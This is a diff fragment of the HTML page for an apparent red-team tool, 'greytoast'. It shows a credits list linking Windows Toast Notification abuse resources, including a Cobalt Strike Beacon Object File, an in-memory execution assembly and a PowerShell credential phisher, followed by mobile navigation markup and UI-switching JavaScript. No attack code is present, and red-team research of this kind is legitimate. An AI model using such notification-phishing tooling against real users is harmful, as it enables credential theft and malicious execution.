+      <div style="font-size:.62rem;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:7px;display:flex;align-items:center;gap:6px">
+        <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="6" r="5" stroke="currentColor" stroke-width="1"/><path d="M6 4v4M4 6h4" stroke="currentColor" stroke-width="1" stroke-linecap="round"/></svg>
+        Credits &amp; References
+      </div>
+      <div style="display:flex;flex-direction:column;gap:5px">
+      <a href="https://github.com/ivancabrera02/ToastNotifications?tab=readme-ov-file" target="_blank" style="display:flex;align-items:flex-start;gap:8px;padding:6px 9px;border-radius:5px;background:var(--bg);border:1px solid var(--border);text-decoration:none;transition:border-color .15s;cursor:pointer" onmouseover="this.style.borderColor='var(--border3)'" onmouseout="this.style.borderColor='var(--border)'">
+        <div style="margin-top:1px;color:var(--text2)"><svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor" style="flex-shrink:0;opacity:.7"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.009-.868-.013-1.703-2.782.604-3.369-1.34-3.369-1.34-.454-1.156-1.11-1.464-1.11-1.464-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.831.092-.646.35-1.086.636-1.336-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836c.85.004 1.705.114 2.504.336 1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.203 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683 0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg></div>
+        <div style="min-width:0">
+          <div style="font-size:.67rem;font-weight:600;color:var(--text);line-height:1.3">ivancabrera02 / ToastNotifications</div>
+          <div style="font-size:.6rem;color:var(--text2);margin-top:1px;line-height:1.4">Original scenario matrix, AUMID reference table, and PowerShell implementation this tool is based on</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent);margin-top:3px;opacity:.8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">https://github.com/ivancabrera02/ToastNotifications?tab=readme-ov-file</div>
+        </div>
+      </a>
+      <a href="https://ipurple.team/2026/03/25/toast-notifications/" target="_blank" style="display:flex;align-items:flex-start;gap:8px;padding:6px 9px;border-radius:5px;background:var(--bg);border:1px solid var(--border);text-decoration:none;transition:border-color .15s;cursor:pointer" onmouseover="this.style.borderColor='var(--border3)'" onmouseout="this.style.borderColor='var(--border)'">
+        <div style="margin-top:1px;color:var(--text2)"><svg width="10" height="10" viewBox="0 0 10 10" fill="none" style="flex-shrink:0;opacity:.6"><path d="M4 2H2a1 1 0 00-1 1v5a1 1 0 001 1h5a1 1 0 001-1V6M6 1h3m0 0v3m0-3L4.5 5.5" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <div style="min-width:0">
+          <div style="font-size:.67rem;font-weight:600;color:var(--text);line-height:1.3">ipurple.team — Toast Notifications Playbook</div>
+          <div style="font-size:.6rem;color:var(--text2);margin-top:1px;line-height:1.4">Comprehensive red team playbook covering Toast Notification abuse techniques and operational guidance</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent);margin-top:3px;opacity:.8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">https://ipurple.team/2026/03/25/toast-notifications/</div>
+        </div>
+      </a>
+      <a href="https://github.com/netbiosX/ToastNotify" target="_blank" style="display:flex;align-items:flex-start;gap:8px;padding:6px 9px;border-radius:5px;background:var(--bg);border:1px solid var(--border);text-decoration:none;transition:border-color .15s;cursor:pointer" onmouseover="this.style.borderColor='var(--border3)'" onmouseout="this.style.borderColor='var(--border)'">
+        <div style="margin-top:1px;color:var(--text2)"><svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor" style="flex-shrink:0;opacity:.7"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.009-.868-.013-1.703-2.782.604-3.369-1.34-3.369-1.34-.454-1.156-1.11-1.464-1.11-1.464-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.831.092-.646.35-1.086.636-1.336-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836c.85.004 1.705.114 2.504.336 1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.203 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683 0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg></div>
+        <div style="min-width:0">
+          <div style="font-size:.67rem;font-weight:600;color:var(--text);line-height:1.3">netbiosX / ToastNotify</div>
+          <div style="font-size:.6rem;color:var(--text2);margin-top:1px;line-height:1.4">C# assembly for in-memory Toast Notification execution — avoids dropping files to disk</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent);margin-top:3px;opacity:.8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">https://github.com/netbiosX/ToastNotify</div>
+        </div>
+      </a>
+      <a href="https://github.com/brmkit/toastnotify-bof" target="_blank" style="display:flex;align-items:flex-start;gap:8px;padding:6px 9px;border-radius:5px;background:var(--bg);border:1px solid var(--border);text-decoration:none;transition:border-color .15s;cursor:pointer" onmouseover="this.style.borderColor='var(--border3)'" onmouseout="this.style.borderColor='var(--border)'">
+        <div style="margin-top:1px;color:var(--text2)"><svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor" style="flex-shrink:0;opacity:.7"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.009-.868-.013-1.703-2.782.604-3.369-1.34-3.369-1.34-.454-1.156-1.11-1.464-1.11-1.464-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.831.092-.646.35-1.086.636-1.336-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836c.85.004 1.705.114 2.504.336 1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.203 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683 0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg></div>
+        <div style="min-width:0">
+          <div style="font-size:.67rem;font-weight:600;color:var(--text);line-height:1.3">brmkit / toastnotify-bof</div>
+          <div style="font-size:.6rem;color:var(--text2);margin-top:1px;line-height:1.4">Beacon Object File implementation for use within Cobalt Strike and compatible C2 frameworks</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent);margin-top:3px;opacity:.8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">https://github.com/brmkit/toastnotify-bof</div>
+        </div>
+      </a>
+      <a href="https://github.com/fox-it/Invoke-CredentialPhisher" target="_blank" style="display:flex;align-items:flex-start;gap:8px;padding:6px 9px;border-radius:5px;background:var(--bg);border:1px solid var(--border);text-decoration:none;transition:border-color .15s;cursor:pointer" onmouseover="this.style.borderColor='var(--border3)'" onmouseout="this.style.borderColor='var(--border)'">
+        <div style="margin-top:1px;color:var(--text2)"><svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor" style="flex-shrink:0;opacity:.7"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.009-.868-.013-1.703-2.782.604-3.369-1.34-3.369-1.34-.454-1.156-1.11-1.464-1.11-1.464-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.831.092-.646.35-1.086.636-1.336-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836c.85.004 1.705.114 2.504.336 1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.203 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683 0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg></div>
+        <div style="min-width:0">
+          <div style="font-size:.67rem;font-weight:600;color:var(--text);line-height:1.3">Fox-IT / Invoke-CredentialPhisher</div>
+          <div style="font-size:.6rem;color:var(--text2);margin-top:1px;line-height:1.4">PowerShell credential phishing via Windows notifications — Fox-IT research</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent);margin-top:3px;opacity:.8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">https://github.com/fox-it/Invoke-CredentialPhisher</div>
+        </div>
+      </a>
+      <a href="https://learn.microsoft.com/en-us/windows/apps/design/shell/tiles-and-notifications/toast-notifications-overview" target="_blank" style="display:flex;align-items:flex-start;gap:8px;padding:6px 9px;border-radius:5px;background:var(--bg);border:1px solid var(--border);text-decoration:none;transition:border-color .15s;cursor:pointer" onmouseover="this.style.borderColor='var(--border3)'" onmouseout="this.style.borderColor='var(--border)'">
+        <div style="margin-top:1px;color:var(--text2)"><svg width="10" height="10" viewBox="0 0 10 10" fill="none" style="flex-shrink:0;opacity:.6"><path d="M4 2H2a1 1 0 00-1 1v5a1 1 0 001 1h5a1 1 0 001-1V6M6 1h3m0 0v3m0-3L4.5 5.5" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <div style="min-width:0">
+          <div style="font-size:.67rem;font-weight:600;color:var(--text);line-height:1.3">Microsoft — Toast Notifications Overview</div>
+          <div style="font-size:.6rem;color:var(--text2);margin-top:1px;line-height:1.4">Official Microsoft documentation covering the Toast Notification XML schema, activationTypes, and scenarios</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent);margin-top:3px;opacity:.8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">https://learn.microsoft.com/en-us/windows/apps/design/shell/tiles-and-notifications/toast-notifications-overview</div>
+        </div>
+      </a>
+      <a href="https://attack.mitre.org/techniques/T1204/001/" target="_blank" style="display:flex;align-items:flex-start;gap:8px;padding:6px 9px;border-radius:5px;background:var(--bg);border:1px solid var(--border);text-decoration:none;transition:border-color .15s;cursor:pointer" onmouseover="this.style.borderColor='var(--border3)'" onmouseout="this.style.borderColor='var(--border)'">
+        <div style="margin-top:1px;color:var(--text2)"><svg width="10" height="10" viewBox="0 0 10 10" fill="none" style="flex-shrink:0;opacity:.6"><path d="M4 2H2a1 1 0 00-1 1v5a1 1 0 001 1h5a1 1 0 001-1V6M6 1h3m0 0v3m0-3L4.5 5.5" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+        <div style="min-width:0">
+          <div style="font-size:.67rem;font-weight:600;color:var(--text);line-height:1.3">MITRE ATT&amp;CK T1204.001 — User Execution: Malicious Link</div>
+          <div style="font-size:.6rem;color:var(--text2);margin-top:1px;line-height:1.4">ATT&amp;CK technique mapping for user-initiated execution via malicious links embedded in notifications</div>
+          <div style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent);margin-top:3px;opacity:.8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">https://attack.mitre.org/techniques/T1204/001/</div>
+        </div>
+      </a>
+      </div>
+    </div>
+    <div style="border-top:1px solid var(--border);padding-top:12px;margin-top:14px;display:flex;align-items:center;justify-content:space-between;gap:10px">
+      <a href="https://github.com/zer0lightning/greytoast" target="_blank" style="font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--accent);text-decoration:none;display:flex;align-items:center;gap:5px" onmouseover="this.style.opacity='.7'" onmouseout="this.style.opacity='1'">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.418 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.009-.868-.013-1.703-2.782.604-3.369-1.34-3.369-1.34-.454-1.156-1.11-1.464-1.11-1.464-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.831.092-.646.35-1.086.636-1.336-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.029-2.683-.103-.253-.446-1.27.098-2.647 0 0 .84-.269 2.75 1.025A9.578 9.578 0 0112 6.836c.85.004 1.705.114 2.504.336 1.909-1.294 2.747-1.025 2.747-1.025.546 1.377.203 2.394.1 2.647.64.699 1.028 1.592 1.028 2.683 0 3.842-2.339 4.687-4.566 4.935.359.309.678.919.678 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.163 22 16.418 22 12c0-5.523-4.477-10-10-10z"/></svg>
+        github.com/zer0lightning/greytoast
+      </a>
+      <button class="m-btn cancel" onclick="document.getElementById('aboutOverlay').classList.remove('show')" style="flex:none;padding:7px 20px">Close</button>
+    </div>
+  </div>
+</div>
+
+
+<!-- MOBILE BOTTOM NAV -->
+<div class="mob-nav" id="mobNav">
+  <button class="mob-tab active" id="mtab-scenarios" onclick="mobSwitch('scenarios')">
+    <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><rect x="2" y="3" width="14" height="11" rx="2" stroke="currentColor" stroke-width="1.3"/><path d="M5 7h8M5 10h5" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/></svg>
+    <span>Scenarios</span>
+    <div class="mob-tab-dot"></div>
+  </button>
+  <button class="mob-tab" id="mtab-editor" onclick="mobSwitch('editor')">
+    <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M4 6l3 3-3 3M9 12h5" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    <span>Editor</span>
+    <div class="mob-tab-dot"></div>
+  </button>
+  <button class="mob-tab" id="mtab-preview" onclick="mobSwitch('preview')">
+    <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><rect x="2" y="4" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.3"/><path d="M5 15h8" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/></svg>
+    <span>Output</span>
+    <div class="mob-tab-dot"></div>
+  </button>
+  <button class="mob-tab bar-btn-adv" id="mtab-more" onclick="showAdvanced()">
+    <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="1.5" fill="currentColor"/><circle cx="4" cy="9" r="1.5" fill="currentColor"/><circle cx="14" cy="9" r="1.5" fill="currentColor"/></svg>
+    <span>More</span>
+    <div class="mob-tab-dot" style="display:none"></div>
+  </button>
+</div>
+
+<script>
+
+// ─── MOBILE PANEL SWITCHING ──────────────────────────────
+let mobActive = 'scenarios';
+
+function isMobile(){ return window.innerWidth <= 768; }
+
+function mobSwitch(panel){
+  if(!isMobile()) return;
+  mobActive = panel;
+
+  // Update panels
+  ['panelLeft','panelCenter','panelRight'].forEach(id=>{
+    document.getElementById(id).classList.remove('mob-panel-active');
+  });
+  const map = { scenarios:'panelLeft', editor:'panelCenter', preview:'panelRight' };
+  if(map[panel]) document.getElementById(map[panel]).classList.add('mob-panel-active');
+
+  // Update tabs
+  document.querySelectorAll('.mob-tab').forEach(t=>t.classList.remove('active'));
+  const tb = document.getElementById('mtab-'+panel);
+  if(tb) tb.classList.add('active');
+
+  // Show/hide the fixed editor action bar
+  const edBar = document.getElementById('mobEditorBar');
+  if(edBar) edBar.style.display = (panel === 'editor') ? 'flex' : 'none';
+}
+
+function mobInit(){
+  if(!isMobile()) return;
+  mobSwitch('scenarios');
+}
+
+function mobCopyAndShow(){
+  copyOut();
+  setTimeout(()=>mobSwitch('preview'), 150);
+}
+
+// Auto-switch to editor on mobile when scenario is selected
+const _origLoad = load;
+load = function(s){
+  _origLoad(s);
+  // Update mobile breadcrumb label
+  const lbl = document.getElementById('mobCrumbLabel');
+  if(lbl && s) lbl.textContent = s.name || '—';
+  if(isMobile() && mobActive === 'scenarios'){
+    setTimeout(()=>mobSwitch('editor'), 80);
+  }
+};
+
+// Handle resize: reset if going back to desktop
+window.addEventListener('resize', ()=>{
+  if(!isMobile()){
+    ['panelLeft','panelCenter','panelRight'].forEach(id=>{
+      document.getElementById(id).classList.remove('mob-panel-active');
+    });
+  } else {
+    mobInit();
+  }
+});
+
+mobInit();
+
+</script>
+</body>
+</html>
